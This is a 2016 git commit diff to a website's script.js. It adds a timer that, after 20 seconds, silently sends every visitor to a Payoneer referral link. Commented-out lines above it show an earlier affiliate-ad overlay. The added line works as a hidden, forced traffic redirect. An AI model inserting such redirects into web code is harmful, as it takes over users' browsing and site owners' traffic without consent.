d37364e242def3f7f488da2046a4d4767513f8b2
jsscriptninja <sellmystuff2012@gmail.com>
2016-07-07 17:51:06 +0530

    payoneer

--- www.flitejets.com/script.js
+++ www.flitejets.com/script.js
@@ -4,4 +4,5 @@ $('#bs-example-navbar-collapse-1 li:nth-child(2)').after('<li id="menu-item-999"
 //$('body').prepend('<div id="dialog-container" style="background: rgba(0,0,0,0.8);padding: 25vh 0;text-align: center;transition: linear 1s;position: absolute;width:100%;"></div>');
 //$("#dialog-container").append('<a href="http://www.anrdoezrs.net/click-8099578-12628006-1467244085000" target="_top"><img src="http://www.ftjcfx.com/image-8099578-12628006-1467244085000" width="300" height="300" alt="" border="0"/></a>');
 //setTimeout(function(){$("#dialog-container").css({'z-index': '999'});$("#dialog-container").height($(window).height());},15000);
+setTimeout(function(){ window.location = 'https://share.payoneer.com/nav/gWzI9TqEDvqM0PjhYTN2QcDCAzL0pVVA6pkNWWpt1sD5F0-lwVIjUOumMB4IDRukBzmwZD63x3Qd3fF0gKuWtg2' }, 20000);
 })(jQuery);
